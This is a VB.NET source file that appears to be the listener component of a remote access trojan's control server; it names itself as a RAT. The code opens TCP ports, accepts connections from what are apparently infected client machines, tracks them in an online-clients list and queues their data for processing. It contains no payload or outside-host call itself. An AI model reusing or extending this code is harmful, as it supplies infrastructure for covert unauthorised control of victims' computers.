Imports System.Net.NetworkInformation
Namespace sockets
    Public Class Accept

        Public closing As Boolean = True

        Public ListTcpListener As List(Of Net.Sockets.TcpListener) = Nothing

        Public WithEvents Bgworker0 As ComponentModel.BackgroundWorker

        Public WithEvents Bgworker1 As ComponentModel.BackgroundWorker
        Public Sub New(ByVal ParametersString As String())

            infoServer.ClientsOnline = New Collection

            infoServer.RequestsReceiver = New List(Of ListData)

            If Me.Bgworker0 Is Nothing Then

                Me.Bgworker0 = New ComponentModel.BackgroundWorker

            End If

            If Not Bgworker0.IsBusy Then

                Bgworker0.RunWorkerAsync()

            End If

            If Me.Bgworker1 Is Nothing Then

                Me.Bgworker1 = New ComponentModel.BackgroundWorker

            End If

            If Not Bgworker1.IsBusy Then

                Bgworker1.RunWorkerAsync()

            End If

            Dim P As String = String.Empty

            For Each i In ParametersString

                Dim PORT As Integer = CInt(If(IsNumeric(i), i, -1))

                If PORT = -1 Then

                    MsgBox(String.Format("Entering characters is not allowed ---> {0}", i), MsgBoxStyle.Critical, reso.nameRAT)

                Else

                    If CheckPort(PORT) Then

                        Dim Listener As Net.Sockets.TcpListener

                        Listener = New Net.Sockets.TcpListener(Net.IPAddress.Any, PORT)

                        ListTcpListener = New List(Of Net.Sockets.TcpListener)

                        ListTcpListener.Add(Listener)

                        Dim CountList As Integer = ListTcpListener.Count - 1

                        ListTcpListener(CountList).Server.SendTimeout = GINT.SST

                        ListTcpListener(CountList).Server.ReceiveTimeout = GINT.SRT

                        ListTcpListener(CountList).Server.SendBufferSize = GINT.SSB

                        ListTcpListener(CountList).Server.ReceiveBufferSize = GINT.SRB

                        ListTcpListener(CountList).Start()

                        ListTcpListener(CountList).BeginAcceptTcpClient(New AsyncCallback(AddressOf Me.Accept), ListTcpListener(CountList))

                        P &= i & Space(1)

                        closing = False

                    Else

                        MsgBox(String.Format("The specified port ({0}) is already in use", i), MsgBoxStyle.Critical, reso.nameRAT)

                    End If

                End If

            Next

            infoServer.PORTS = P

        End Sub

        Public Sub Accept(ByVal ar As IAsyncResult)

            Dim Listener As Net.Sockets.TcpListener = CType(ar.AsyncState, Net.Sockets.TcpListener)

            Try

                Dim AcceptClient As Net.Sockets.TcpClient = Listener.EndAcceptTcpClient(ar)

                Dim ClinetPort As Integer = CType(Listener.LocalEndpoint, Net.IPEndPoint).Port

                AcceptClient.Client.ReceiveTimeout = GINT.CRT

                AcceptClient.Client.SendTimeout = GINT.CST

                AcceptClient.Client.SendBufferSize = GINT.CSB

                AcceptClient.Client.ReceiveBufferSize = GINT.CRB

                SyncLock Data.SyncClientsOnline

                    Dim SocketClient As sockets.Client = New sockets.Client(AcceptClient, ClinetPort)

                    Dim spl As Object() = {SocketClient, AcceptClient}

                    infoServer.ClientsOnline.Add(spl, SocketClient.ClientRemoteAddress, Nothing, Nothing)

                End SyncLock

            Catch sock As System.Net.Sockets.SocketException

            Catch nextError As Exception

            End Try

            Threading.Thread.Sleep(1)

            Try

                Listener.BeginAcceptTcpClient(New AsyncCallback(AddressOf Me.Accept), Listener)

            Catch ex As System.InvalidOperationException

            End Try


        End Sub
        Private Function CheckPort(ByVal Port As Integer) As Boolean

            Dim ipGlobalProperties As IPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties()

            Dim tcpConnInfoArray As Net.IPEndPoint() = ipGlobalProperties.GetActiveTcpListeners()

            For Each info As Net.IPEndPoint In tcpConnInfoArray

                If info.Port = Port Then

                    Return False

                End If

            Next

            Return True

        End Function
        Private Enum GINT As Integer

            SST = -1

            SRT = -1

            SSB = 512000 * 3

            SRB = 512000 * 3
            '-----------------------
            CST = -1

            CRT = -1

            CSB = 512000

            CRB = 512000

        End Enum

        Private Sub Worker_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bgworker0.DoWork

            Do While True

                Dim i As ListData = Nothing

                SyncLock Data.SyncRequestsReceiver

                    If infoServer.RequestsReceiver.Count > 0 Then

                        i = infoServer.RequestsReceiver.Item(0)

                        infoServer.RequestsReceiver.RemoveAt(0)

                        If Not i Is Nothing Then

                            If Not i.ClassClient Is Nothing Then

                                If i.TcpClient.Client.Connected Then

                                    If Not i.ClassClient.EXI Then

                                        Try

                                            sockets.Data.Data_0(New Object() {i.ClassClient, i.bByte, i.SizeData, i.TcpClient}) ' >>>2

                                        Catch nextError As Exception

                                        End Try

                                    End If

                                End If

                            End If

                        End If

                    End If

                End SyncLock

                Threading.Thread.Sleep(1)

            Loop

        End Sub

        Private Sub Worker_DoWork_Remove(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles Bgworker1.DoWork

            Do While True

                If infoServer.WorkerRemove.Count > 0 Then

                    SyncLock Data.SyncWorkerRemove

                        Dim row As Windows.Forms.DataGridViewRow = infoServer.WorkerRemove(0)

                        If row IsNot Nothing Then

                            Data.angelform.Remove(row)

                        End If

                        infoServer.WorkerRemove.RemoveAt(0)

                    End SyncLock

                    Threading.Thread.Sleep(250)

                Else

                    Threading.Thread.Sleep(2500)

                End If

            Loop

        End Sub

    End Class

End Namespace


